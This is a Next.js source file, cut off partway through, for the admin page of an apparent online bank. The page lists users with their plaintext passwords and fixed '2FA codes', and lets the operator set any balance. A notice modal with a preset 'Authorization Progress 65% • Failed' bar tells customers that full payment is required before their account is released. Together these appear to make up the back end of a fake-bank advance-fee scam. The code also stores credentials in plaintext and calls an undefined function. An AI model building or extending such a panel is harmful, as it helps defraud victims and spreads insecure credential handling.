'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { 
  Users, 
  CreditCard, 
  History, 
  CheckCircle, 
  AlertCircle, 
  Search, 
  Power, 
  PowerOff, 
  Shield, 
  UserPlus, 
  Edit, 
  Trash2, 
  Key, 
  AlertTriangle,
  Lock, 
  X,
  DollarSign
} from 'lucide-react';
import Navbar from '../../components/Navbar';
import { useRouter } from 'next/router';
import Sidebar from '../../components/Sidebar';
import Card from '../../components/Card';
import Button from '../../components/Button';
import Input from '../../components/Input';
import { useAuth } from '../../utils/AuthContext';

const ALL_AVAILABLE_PAGES = [
  { id: 'dashboard', label: 'Dashboard' },
  { id: 'transfer', label: 'Transfer Money' },
  { id: 'transactions', label: 'Transaction History' },
  { id: 'wire-transfer', label: 'Wire Transfer' },
  { id: 'cards', label: 'Cards & Virtual Cards' },
  { id: 'bill-pay', label: 'Bill Pay & AutoPay' },
  { id: 'deposit', label: 'Deposit Checks' },
  { id: 'statements', label: 'Statements & Taxes' },
  { id: 'credit-score', label: 'FICO® Credit Score' },
  { id: 'security', label: 'Security & Sessions' },
  { id: 'messages', label: 'Secure Messages' },
  { id: 'settings', label: 'Settings' },
];

const DEFAULT_PAGES = ALL_AVAILABLE_PAGES.map((p) => p.id);

const AdminUsersPage = () => {
  const router = useRouter();
  const { user, logout, loading: authLoading } = useAuth();

  const [users, setUsers] = useState([]);
  const [loadingUsers, setLoadingUsers] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [websiteOpen, setWebsiteOpen] = useState(true);
  const [loadingWebsiteStatus, setLoadingWebsiteStatus] = useState(true);

  // Modals state
  const [showAddModal, setShowAddModal] = useState(false);
  const [showEditModal, setShowEditModal] = useState(false);
  const [showNoticeModal, setShowNoticeModal] = useState(false);
  const [noticeUser, setNoticeUser] = useState(null);
  const [actionLoading, setActionLoading] = useState(false);

  // Forms state
  const [newUser, setNewUser] = useState({
    name: '',
    email: '',
    password: '',
    twoFactorCode: '345094',
    initialBalance: '50000',
    accountType: 'Checking',
    status: 'active',
    allowedPages: DEFAULT_PAGES,
  });

  const [editUser, setEditUser] = useState({
    id: '',
    name: '',
    email: '',
    password: '',
    twoFactorCode: '',
    balance: '',
    status: 'active',
    allowedPages: [],
  });

  const [noticeForm, setNoticeForm] = useState({
    enabled: false,
    message: '',
    progress: 65,
    progressStatus: '65% • Failed',
    progressLabel: 'Authorization Progress',
  });

  // Redirect non-admins
  useEffect(() => {
    if (!authLoading && (!user || user.role !== 'admin')) {
      router.push('/');
    }
  }, [user, router, authLoading]);

  // Fetch users from API
  const fetchUsers = async () => {
    setLoadingUsers(true);
    try {
      const res = await fetch('/api/admin/users');
      if (res.ok) {
        const data = await res.json();
        setUsers(data.users || []);
      }
    } catch (err) {
      console.error('Failed to load users:', err);
    } finally {
      setLoadingUsers(false);
    }
  };

  // Fetch website status
  useEffect(() => {
    const fetchWebsiteStatus = async () => {
      setLoadingWebsiteStatus(true);
      try {
        const res = await fetch('/api/website-status');
        if (res.ok) {
          const data = await res.json();
          setWebsiteOpen(data.isOpen);
        }
      } catch (error) {
        console.error('Error fetching website status:', error);
      } finally {
        setLoadingWebsiteStatus(false);
      }
    };
    fetchWebsiteStatus();
    fetchUsers();
  }, []);

  const handleCreateUser = async (e) => {
    e.preventDefault();
    setActionLoading(true);
    try {
      const res = await fetch('/api/admin/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newUser),
      });
      const data = await res.json();
      if (!res.ok) {
        alert(data.message || 'Failed to create user.');
        setActionLoading(false);
        return;
      }
      alert(`User ${newUser.name} created successfully!`);
      setShowAddModal(false);
      setNewUser({
        name: '',
        email: '',
        password: '',
        twoFactorCode: String(Math.floor(100000 + Math.random() * 900000)),
        initialBalance: '50000',
        accountType: 'Checking',
        status: 'active',
        allowedPages: DEFAULT_PAGES,
      });
      fetchUsers();
    } catch (err) {
      console.error(err);
      alert('Network error while creating user.');
    } finally {
      setActionLoading(false);
    }
  };

  const handleUpdateUser = async (e) => {
    e.preventDefault();
    setActionLoading(true);
    try {
      const res = await fetch('/api/admin/users', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(editUser),
      });
      const data = await res.json();
      if (!res.ok) {
        alert(data.message || 'Failed to update user.');
        setActionLoading(false);
        return;
      }
      alert('User details updated successfully!');
      setShowEditModal(false);
      fetchUsers();
    } catch (err) {
      console.error(err);
      alert('Network error while updating user.');
    } finally {
      setActionLoading(false);
    }
  };

  const handleDeleteUser = async (id, userName) => {
    if (!confirm(`Are you sure you want to delete ${userName}? This will remove all their accounts and transactions.`)) {
      return;
    }
    try {
      const res = await fetch(`/api/admin/users?id=${id}`, { method: 'DELETE' });
      if (res.ok) {
        alert('User deleted successfully.');
        fetchUsers();
      } else {
        alert('Failed to delete user.');
      }
    } catch (err) {
      console.error(err);
      alert('Error deleting user.');
    }
  };

  const handleToggleStatus = async (user) => {
    const nextStatus = user.status === 'active' ? 'flagged' : 'active';
    try {
      const res = await fetch('/api/admin/users', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: user.id, status: nextStatus }),
      });
      if (res.ok) {
        fetchUsers();
      }
    } catch (err) {
      console.error(err);
    }
  };

  const openEditModal = (u) => {
    setEditUser({
      id: u.id,
      name: u.name || '',
      email: u.email || '',
      password: u.password || '',
      twoFactorCode: u.twoFactorCode || '',
      balance: u.totalBalance !== undefined ? String(u.totalBalance) : '',
      status: u.status || 'active',
      allowedPages: Array.isArray(u.allowedPages) && u.allowedPages.length > 0 ? u.allowedPages : DEFAULT_PAGES,
    });
    setShowEditModal(true);
  };

  const openNoticeModal = (u) => {
    setNoticeUser(u);
    const n = u.notice || {};
    setNoticeForm({
      enabled: n.enabled !== undefined ? n.enabled : false,
      message: n.message || "Notice: Please note that full and complete payment is required before access and authorization to your online account and credit card can be granted. Kindly ensure all outstanding balances are settled to avoid delays.",
      progress: typeof n.progress === 'number' ? n.progress : 65,
      progressStatus: n.progressStatus || "65% • Failed",
      progressLabel: n.progressLabel || "Authorization Progress",
    });
    setShowNoticeModal(true);
  };

  const handleSaveNotice = async (e) => {
    e.preventDefault();
    if (!noticeUser) return;
    setActionLoading(true);
    try {
      const res = await fetch('/api/admin/users', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: noticeUser.id,
          notice: noticeForm,
        }),
      });
      if (res.ok) {
        setUsersList((prev) =>
          prev.map((u) => (u.id === noticeUser.id ? { ...u, notice: { ...noticeForm } } : u))
        );
        alert(`Notice settings for ${noticeUser.name} updated successfully!`);
        setShowNoticeModal(false);
        fetchUsers();
      } else {
        alert('Failed to save notice settings.');
      }
    } catch (err) {
      console.error(err);
      alert('Error updating notice settings.');
    } finally {
      setActionLoading(false);
    }
  };

  const getStatusBadge = (status) => {
    const styles = {
      active: 'bg-green-100 text-green-700',
      pending: 'bg-yellow-100 text-yellow-700',
      flagged: 'bg-red-100 text-red-700',
    };
    return (
      <span className={`px-2 py-1 rounded-full text-xs font-semibold capitalize ${styles[status] || 'bg-neutral-100 text-neutral-700'}`}>
        {status}
      </span>
    );
  };

  const filteredUsers = users.filter(
    (u) =>
      u.name?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      u.email?.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const tabs = [
    { id: 'users', label: 'Users', icon: Users, path: '/admin' },
    { id: 'accounts', label: 'Accounts', icon: CreditCard, path: '/admin/accounts' },
    { id: 'transactions', label: 'Transactions', icon: History, path: '/admin/transactions' },
  ];

  return (
    <div className="min-h-screen bg-neutral-50">
      {authLoading ? (
        <div className="flex items-center justify-center min-h-screen text-lg text-neutral-600">
          Loading authentication status...
        </div>
      ) : (!user || user.role !== 'admin') ? (
        <div className="flex items-center justify-center min-h-screen text-lg text-neutral-600">
          Redirecting to login...
        </div>
      ) : (
        <>
          <Navbar user={user} onLogout={logout} />
          <div className="flex">
            <Sidebar isAdmin={true} />
            <main className="flex-1 p-4 sm:p-6 lg:p-8">
              <div className="max-w-7xl mx-auto space-y-6">
                
                {/* Header & Master Switch */}
                <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div>
                    <h1 className="text-3xl font-bold text-primary-navy mb-1">User & Account Management</h1>
                    <p className="text-neutral-600 text-sm">Create, manage, and configure users, credentials, balances, and access.</p>
                  </div>

                  <div className="flex flex-wrap items-center gap-3 w-full md:w-auto">
                    <Button
                      onClick={() => setShowAddModal(true)}
                      className="flex items-center space-x-2 bg-primary-blue text-white px-4 py-2.5 rounded-bank hover:bg-opacity-90 shadow-bank"
                    >
                      <UserPlus className="w-4 h-4" />
                      <span>Add New User</span>
                    </Button>

                    <Card className="p-2 px-4 shadow-sm border border-neutral-200">
                      <div className="flex items-center space-x-3">
                        <div className="flex items-center space-x-2">
                          <Shield className="w-4 h-4 text-primary-blue" />
                          <span className="text-xs font-semibold text-neutral-700">Site Status:</span>
                          <span className={`px-2 py-0.5 rounded-full text-xs font-bold ${
                            websiteOpen ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'
                          }`}>
                            {websiteOpen ? 'Open' : 'Closed'}
                          </span>
                        </div>
                        <Button
                          variant={websiteOpen ? 'danger' : 'primary'}
                          onClick={async () => {
                            const newStatus = !websiteOpen;
                            try {
                              const res = await fetch('/api/website-status', {
                                method: 'PUT',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ isOpen: newStatus }),
                              });
                              if (res.ok) {
                                setWebsiteOpen(newStatus);
                                alert(`Website has been ${newStatus ? 'opened' : 'closed'}.`);
                              }
                            } catch (e) {
                              console.error(e);
                            }
                          }}
                          className="px-3 py-1 text-xs"
                        >
                          {websiteOpen ? <PowerOff className="w-3.5 h-3.5 mr-1 inline" /> : <Power className="w-3.5 h-3.5 mr-1 inline" />}
                          {websiteOpen ? 'Close Site' : 'Open Site'}
                        </Button>
                      </div>
                    </Card>
                  </div>
                </div>

                {/* Tabs */}
                <div className="bg-white rounded-card shadow-bank p-1 flex space-x-1 overflow-x-auto">
                  {tabs.map((tab) => {
                    const Icon = tab.icon;
                    return (
                      <Link
                        key={tab.id}
                        href={tab.path}
                        className={`flex-1 min-w-[130px] sm:min-w-0 flex items-center justify-center space-x-1.5 sm:space-x-2 px-3 sm:px-4 py-2 sm:py-2.5 rounded-bank transition-all text-xs sm:text-sm whitespace-nowrap ${
                          router.pathname === tab.path
                            ? 'bg-primary-blue text-white shadow-bank font-semibold'
                            : 'text-neutral-600 hover:bg-accent-soft'
                        }`}
                      >
                        <Icon className="w-4 h-4 flex-shrink-0" />
                        <span>{tab.label}</span>
                      </Link>
                    );
                  })}
                </div>

                {/* Search */}
                <Card className="p-3">
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-neutral-400 w-5 h-5" />
                    <Input
                      placeholder="Search users by name or email..."
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      className="pl-10 text-sm"
                    />
                  </div>
                </Card>

                {/* Users Table */}
                <Card 
                  title={`All Registered Users (${filteredUsers.length})`}
                  subtitle="Manage accounts, login passwords, 2FA codes, and balances"
                >
                  {/* Desktop Table (Hidden on Mobile) */}
                  <div className="hidden md:block overflow-x-auto">
                    <table className="min-w-full divide-y divide-neutral-200 text-sm">
                      <thead>
                        <tr className="border-b border-neutral-200 bg-neutral-50 text-neutral-600">
                          <th className="text-left py-3 px-4 font-semibold">User</th>
                          <th className="text-left py-3 px-4 font-semibold">Email</th>
                          <th className="text-left py-3 px-4 font-semibold">Password</th>
                          <th className="text-left py-3 px-4 font-semibold">2FA Code</th>
                          <th className="text-left py-3 px-4 font-semibold">Total Balance</th>
                          <th className="text-left py-3 px-4 font-semibold">Status</th>
                          <th className="text-right py-3 px-4 font-semibold">Actions</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-neutral-200">
                        {loadingUsers ? (
                          <tr>
                            <td colSpan="7" className="text-center py-8 text-neutral-500">
                              Loading users...
                            </td>
                          </tr>
                        ) : filteredUsers.length === 0 ? (
                          <tr>
                            <td colSpan="7" className="text-center py-8 text-neutral-500">
                              No users found matching "{searchQuery}".
                            </td>
                          </tr>
                        ) : (
                          filteredUsers.map((u) => (
                            <tr key={u.id} className="hover:bg-neutral-50 transition-colors">
                              <td className="py-3 px-4">
                                <div className="flex items-center space-x-3">
                                  <div className="w-8 h-8 bg-primary-navy text-white rounded-full flex items-center justify-center font-bold text-xs flex-shrink-0">
                                    {u.name ? u.name.charAt(0).toUpperCase() : 'U'}
                                  </div>
                                  <div>
                                    <div className="font-semibold text-neutral-900">{u.name}</div>
                                    <div className="text-xs text-neutral-500 font-mono">
                                      {u.primaryAccount ? u.primaryAccount.accountNumber : 'No account'}
                                    </div>
                                  </div>
                                </div>
                              </td>
                              <td className="py-3 px-4 text-neutral-700">{u.email}</td>
                              <td className="py-3 px-4 font-mono text-neutral-600">
                                <span className="bg-neutral-100 px-2 py-1 rounded text-xs">
                                  {u.password || '••••••••'}
                                </span>
                              </td>
                              <td className="py-3 px-4">
                                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-mono font-bold bg-blue-50 text-primary-blue border border-blue-200">
                                  <Key className="w-3 h-3 mr-1" />
                                  {u.twoFactorCode || '123456'}
                                </span>
                              </td>
                              <td className="py-3 px-4 font-semibold text-neutral-900">
                                ${(Number(u.totalBalance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                              </td>
                              <td className="py-3 px-4">{getStatusBadge(u.status)}</td>
                              <td className="py-3 px-4 text-right">
                                <div className="flex items-center justify-end space-x-2">
                                  <button
                                    onClick={() => openNoticeModal(u)}
                                    className={`p-1.5 rounded transition-colors ${
                                      u.notice?.enabled
                                        ? 'text-accent-red bg-red-100 hover:bg-red-200 ring-1 ring-red-400'
                                        : 'text-neutral-500 hover:text-accent-red hover:bg-neutral-100'
                                    }`}
                                    title={u.notice?.enabled ? "Warning Active (Click to edit/disable)" : "Configure Account Warning Notice"}
                                  >
                                    <AlertTriangle className="w-4 h-4" />
                                  </button>
                                  <button
                                    onClick={() => openEditModal(u)}
                                    className="p-1.5 text-primary-blue hover:bg-blue-50 rounded transition-colors"
                                    title="Edit User & Balance"
                                  >
                                    <Edit className="w-4 h-4" />
                                  </button>
                                  <button
                                    onClick={() => handleToggleStatus(u)}
                                    className={`p-1.5 rounded transition-colors ${
                                      u.status === 'active' ? 'text-amber-600 hover:bg-amber-50' : 'text-green-600 hover:bg-green-50'
                                    }`}
                                    title={u.status === 'active' ? 'Flag User' : 'Activate User'}
                                  >
                                    {u.status === 'active' ? <AlertCircle className="w-4 h-4" /> : <CheckCircle className="w-4 h-4" />}
                                  </button>
                                  <button
                                    onClick={() => handleDeleteUser(u.id, u.name)}
                                    className="p-1.5 text-accent-red hover:bg-red-50 rounded transition-colors"
                                    title="Delete User"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </button>
                                </div>
                              </td>
                            </tr>
                          ))
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Cards View (Visible on Phones below md) */}
                  <div className="md:hidden divide-y divide-neutral-200">
                    {loadingUsers ? (
                      <div className="text-center py-8 text-neutral-500 text-sm">Loading users...</div>
                    ) : filteredUsers.length === 0 ? (
                      <div className="text-center py-8 text-neutral-500 text-sm">No users found matching "{searchQuery}".</div>
                    ) : (
                      filteredUsers.map((u) => (
                        <div key={u.id} className="py-4 space-y-3">
                          <div className="flex items-center justify-between">
                            <div className="flex items-center space-x-3 min-w-0">
                              <div className="w-9 h-9 bg-primary-navy text-white rounded-full flex items-center justify-center font-bold text-xs flex-shrink-0">
                                {u.name ? u.name.charAt(0).toUpperCase() : 'U'}
                              </div>
                              <div className="min-w-0">
                                <div className="font-semibold text-neutral-900 text-sm truncate">{u.name}</div>
                                <div className="text-xs text-neutral-500 truncate">{u.email}</div>
                              </div>
                            </div>
                            <div className="flex-shrink-0 ml-2">{getStatusBadge(u.status)}</div>
                          </div>

                          <div className="bg-neutral-50 p-3 rounded-bank border border-neutral-200 text-xs space-y-2">
                            <div className="flex justify-between items-center">
                              <span className="text-neutral-500">Account:</span>
                              <span className="font-mono font-medium text-neutral-800">
                                {u.primaryAccount ? u.primaryAccount.accountNumber : 'No account'}
                              </span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-neutral-500">Balance:</span>
                              <span className="font-bold text-sm text-neutral-900">
                                ${(Number(u.totalBalance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                              </span>
                            </div>
                            <div className="flex justify-between items-center pt-1.5 border-t border-neutral-200">
                              <span className="text-neutral-500">Password / 2FA:</span>
                              <div className="flex items-center space-x-1.5">
                                <span className="font-mono bg-white px-1.5 py-0.5 rounded border border-neutral-200 text-[11px]">
                                  {u.password || '••••••••'}
                                </span>
                                <span className="font-mono font-bold bg-blue-50 text-primary-blue px-1.5 py-0.5 rounded border border-blue-200 text-[11px]">
                                  {u.twoFactorCode || '123456'}
                                </span>
                              </div>
                            </div>
                          </div>

                          {/* Action Buttons */}
                          <div className="flex items-center justify-end space-x-2 pt-1">
                            <button
                              onClick={() => openNoticeModal(u)}
                              className={`flex items-center space-x-1 px-2.5 py-1.5 rounded text-xs font-semibold transition-colors ${
                                u.notice?.enabled
                                  ? 'bg-red-100 text-accent-red ring-1 ring-red-400'
                                  : 'bg-neutral-100 text-neutral-700 hover:bg-neutral-200'
                              }`}
                            >
                              <AlertTriangle className="w-3.5 h-3.5" />
                              <span>{u.notice?.enabled ? 'Notice On' : 'Notice'}</span>
                            </button>

                            <button
                              onClick={() => openEditModal(u)}
                              className="flex items-center space-x-1 px-2.5 py-1.5 bg-blue-50 text-primary-blue hover:bg-blue-100 rounded text-xs font-semibold transition-colors"
                            >
                              <Edit className="w-3.5 h-3.5" />
                              <span>Edit</span>
                            </button>

                            <button
                              onClick={() => handleToggleStatus(u)}
                              className={`p-1.5 rounded transition-colors ${
                                u.status === 'active' ? 'bg-amber-50 text-amber-600 hover:bg-amber-100' : 'bg-green-50 text-green-600 hover:bg-green-100'
                              }`}
                              title={u.status === 'active' ? 'Flag User' : 'Activate User'}
                            >
                              {u.status === 'active' ? <AlertCircle className="w-4 h-4" /> : <CheckCircle className="w-4 h-4" />}
                            </button>

                            <button
                              onClick={() => handleDeleteUser(u.id, u.name)}
                              className="p-1.5 bg-red-50 text-accent-red hover:bg-red-100 rounded transition-colors"
                              title="Delete User"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </Card>

              </div>
            </main>
          </div>

          {/* ADD USER MODAL */}
          {showAddModal && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4 animate-fade-in">
              <div className="bg-white rounded-card shadow-bank-lg max-w-lg w-full max-h-[90vh] overflow-y-auto p-6 relative">
                <div className="flex justify-between items-center pb-4 border-b border-neutral-200 mb-4">
                  <div className="flex items-center space-x-2">
                    <UserPlus className="w-5 h-5 text-primary-blue" />
                    <h3 className="text-xl font-bold text-primary-navy">Add New Bank User</h3>
                  </div>
                  <button onClick={() => setShowAddModal(false)} className="text-neutral-400 hover:text-neutral-600">
                    <X className="w-5 h-5" />
                  </button>
                </div>

                <form onSubmit={handleCreateUser} className="space-y-4">
                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Full Name *</label>
                    <Input
                      required
                      placeholder="e.g. Robert M. Vance"
                      value={newUser.name}
                      onChange={(e) => setNewUser({ ...newUser, name: e.target.value })}
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Email Address (Login Username) *</label>
                    <Input
                      type="email"
                      required
                      placeholder="e.g. robert@example.com"
                      value={newUser.email}
                      onChange={(e) => setNewUser({ ...newUser, email: e.target.value })}
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Login Password *</label>
                      <Input
                        type="text"
                        required
                        placeholder="e.g. Secure@123"
                        value={newUser.password}
                        onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">6-Digit 2FA Code *</label>
                      <Input
                        type="text"
                        required
                        maxLength={6}
                        placeholder="e.g. 345094"
                        value={newUser.twoFactorCode}
                        onChange={(e) => setNewUser({ ...newUser, twoFactorCode: e.target.value.replace(/\D/g, '') })}
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Initial Balance ($) *</label>
                      <Input
                        type="number"
                        step="0.01"
                        required
                        placeholder="50000.00"
                        value={newUser.initialBalance}
                        onChange={(e) => setNewUser({ ...newUser, initialBalance: e.target.value })}
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Account Type</label>
                      <select
                        value={newUser.accountType}
                        onChange={(e) => setNewUser({ ...newUser, accountType: e.target.value })}
                        className="input-field text-sm"
                      >
                        <option value="Checking">Checking</option>
                        <option value="Savings">Savings</option>
                        <option value="Money Market">Money Market</option>
                      </select>
                    </div>
                  </div>

                  {/* Dashboard Modules / Pages Permission */}
                  <div className="pt-2 border-t border-neutral-200">
                    <div className="flex items-center justify-between mb-2">
                      <div>
                        <label className="block text-xs font-bold text-neutral-800">
                          Visible Dashboard Modules ({newUser.allowedPages.length}/{ALL_AVAILABLE_PAGES.length})
                        </label>
                        <p className="text-[11px] text-neutral-500">Choose which pages appear on this user's sidebar menu</p>
                      </div>
                      <div className="space-x-2">
                        <button
                          type="button"
                          onClick={() => setNewUser({ ...newUser, allowedPages: DEFAULT_PAGES })}
                          className="text-[11px] font-semibold text-primary-blue hover:underline"
                        >
                          Select All
                        </button>
                        <span className="text-neutral-300">|</span>
                        <button
                          type="button"
                          onClick={() => setNewUser({ ...newUser, allowedPages: ['dashboard', 'settings'] })}
                          className="text-[11px] font-semibold text-neutral-500 hover:underline"
                        >
                          Min Core
                        </button>
                      </div>
                    </div>
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 bg-neutral-50 p-3 rounded-bank border border-neutral-200">
                      {ALL_AVAILABLE_PAGES.map((page) => {
                        const isChecked = newUser.allowedPages.includes(page.id);
                        return (
                          <label
                            key={page.id}
                            className={`flex items-center space-x-2 p-1.5 rounded cursor-pointer transition-colors text-xs ${
                              isChecked ? 'bg-blue-50 text-primary-blue font-semibold' : 'text-neutral-600 hover:bg-neutral-100'
                            }`}
                          >
                            <input
                              type="checkbox"
                              checked={isChecked}
                              onChange={(e) => {
                                if (e.target.checked) {
                                  setNewUser({ ...newUser, allowedPages: [...newUser.allowedPages, page.id] });
                                } else {
                                  setNewUser({ ...newUser, allowedPages: newUser.allowedPages.filter((p) => p !== page.id) });
                                }
                              }}
                              className="rounded text-primary-blue focus:ring-primary-blue h-3.5 w-3.5"
                            />
                            <span className="truncate">{page.label}</span>
                          </label>
                        );
                      })}
                    </div>
                  </div>

                  <div className="flex justify-end space-x-3 pt-4 border-t border-neutral-200">
                    <Button variant="secondary" type="button" onClick={() => setShowAddModal(false)}>
                      Cancel
                    </Button>
                    <Button type="submit" disabled={actionLoading}>
                      {actionLoading ? 'Creating User...' : 'Create User & Account'}
                    </Button>
                  </div>
                </form>
              </div>
            </div>
          )}

          {/* EDIT USER MODAL */}
          {showEditModal && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4 animate-fade-in">
              <div className="bg-white rounded-card shadow-bank-lg max-w-lg w-full max-h-[90vh] overflow-y-auto p-6 relative">
                <div className="flex justify-between items-center pb-4 border-b border-neutral-200 mb-4">
                  <div className="flex items-center space-x-2">
                    <Edit className="w-5 h-5 text-primary-blue" />
                    <h3 className="text-xl font-bold text-primary-navy">Edit User & Balance</h3>
                  </div>
                  <button onClick={() => setShowEditModal(false)} className="text-neutral-400 hover:text-neutral-600">
                    <X className="w-5 h-5" />
                  </button>
                </div>

                <form onSubmit={handleUpdateUser} className="space-y-4">
                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Full Name</label>
                    <Input
                      required
                      value={editUser.name}
                      onChange={(e) => setEditUser({ ...editUser, name: e.target.value })}
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Email Address</label>
                    <Input
                      type="email"
                      required
                      value={editUser.email}
                      onChange={(e) => setEditUser({ ...editUser, email: e.target.value })}
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Password</label>
                      <Input
                        type="text"
                        placeholder="Enter new password"
                        value={editUser.password}
                        onChange={(e) => setEditUser({ ...editUser, password: e.target.value })}
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">2FA Login Code</label>
                      <Input
                        type="text"
                        maxLength={6}
                        value={editUser.twoFactorCode}
                        onChange={(e) => setEditUser({ ...editUser, twoFactorCode: e.target.value.replace(/\D/g, '') })}
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Account Balance ($)</label>
                      <Input
                        type="number"
                        step="0.01"
                        required
                        value={editUser.balance}
                        onChange={(e) => setEditUser({ ...editUser, balance: e.target.value })}
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Account Status</label>
                      <select
                        value={editUser.status}
                        onChange={(e) => setEditUser({ ...editUser, status: e.target.value })}
                        className="input-field text-sm"
                      >
                        <option value="active">Active</option>
                        <option value="pending">Pending</option>
                        <option value="flagged">Flagged</option>
                      </select>
                    </div>
                  </div>

                  {/* Dashboard Modules / Pages Permission */}
                  <div className="pt-2 border-t border-neutral-200">
                    <div className="flex items-center justify-between mb-2">
                      <div>
                        <label className="block text-xs font-bold text-neutral-800">
                          Visible Dashboard Modules ({editUser.allowedPages?.length || 0}/{ALL_AVAILABLE_PAGES.length})
                        </label>
                        <p className="text-[11px] text-neutral-500">Choose which pages appear on this user's sidebar menu</p>
                      </div>
                      <div className="space-x-2">
                        <button
                          type="button"
                          onClick={() => setEditUser({ ...editUser, allowedPages: DEFAULT_PAGES })}
                          className="text-[11px] font-semibold text-primary-blue hover:underline"
                        >
                          Select All
                        </button>
                        <span className="text-neutral-300">|</span>
                        <button
                          type="button"
                          onClick={() => setEditUser({ ...editUser, allowedPages: ['dashboard', 'settings'] })}
                          className="text-[11px] font-semibold text-neutral-500 hover:underline"
                        >
                          Min Core
                        </button>
                      </div>
                    </div>
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 bg-neutral-50 p-3 rounded-bank border border-neutral-200">
                      {ALL_AVAILABLE_PAGES.map((page) => {
                        const isChecked = editUser.allowedPages?.includes(page.id);
                        return (
                          <label
                            key={page.id}
                            className={`flex items-center space-x-2 p-1.5 rounded cursor-pointer transition-colors text-xs ${
                              isChecked ? 'bg-blue-50 text-primary-blue font-semibold' : 'text-neutral-600 hover:bg-neutral-100'
                            }`}
                          >
                            <input
                              type="checkbox"
                              checked={isChecked}
                              onChange={(e) => {
                                const current = editUser.allowedPages || [];
                                if (e.target.checked) {
                                  setEditUser({ ...editUser, allowedPages: [...current, page.id] });
                                } else {
                                  setEditUser({ ...editUser, allowedPages: current.filter((p) => p !== page.id) });
                                }
                              }}
                              className="rounded text-primary-blue focus:ring-primary-blue h-3.5 w-3.5"
                            />
                            <span className="truncate">{page.label}</span>
                          </label>
                        );
                      })}
                    </div>
                  </div>

                  <div className="flex justify-end space-x-3 pt-4 border-t border-neutral-200">
                    <Button variant="secondary" type="button" onClick={() => setShowEditModal(false)}>
                      Cancel
                    </Button>
                    <Button type="submit" disabled={actionLoading}>
                      {actionLoading ? 'Saving...' : 'Save Changes'}
                    </Button>
                  </div>
                </form>
              </div>
            </div>
          )}

          {/* NOTICE & WARNING RESTRICTION MODAL */}
          {showNoticeModal && noticeUser && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4 animate-fade-in">
              <div className="bg-white rounded-card shadow-bank-lg max-w-lg w-full max-h-[90vh] overflow-y-auto p-6 relative border-t-4 border-accent-red">
                <div className="flex justify-between items-center pb-4 border-b border-neutral-200 mb-4">
                  <div className="flex items-center space-x-2">
                    <AlertTriangle className="w-5 h-5 text-accent-red" />
                    <h3 className="text-xl font-bold text-primary-navy">Account Warning & Restriction</h3>
                  </div>
                  <button onClick={() => setShowNoticeModal(false)} className="text-neutral-400 hover:text-neutral-600">
                    <X className="w-5 h-5" />
                  </button>
                </div>

                <div className="bg-neutral-50 p-3 rounded-bank border border-neutral-200 mb-4 text-xs">
                  <div><span className="text-neutral-500">Target User:</span> <span className="font-semibold text-neutral-800">{noticeUser.name} ({noticeUser.email})</span></div>
                  <div className="mt-1 text-neutral-500">
                    When active, this warning will pop up on their dashboard upon login, and completely block access to Transaction History & Transfer Money.
                  </div>
                </div>

                <form onSubmit={handleSaveNotice} className="space-y-4">
                  {/* Master Toggle */}
                  <div className="flex items-center justify-between p-3 bg-red-50 border border-red-200 rounded-bank">
                    <div>
                      <div className="text-sm font-bold text-red-900">Enable Restriction Warning</div>
                      <div className="text-xs text-red-700">Display warning popup & block Transfer/Transactions</div>
                    </div>
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input
                        type="checkbox"
                        checked={noticeForm.enabled}
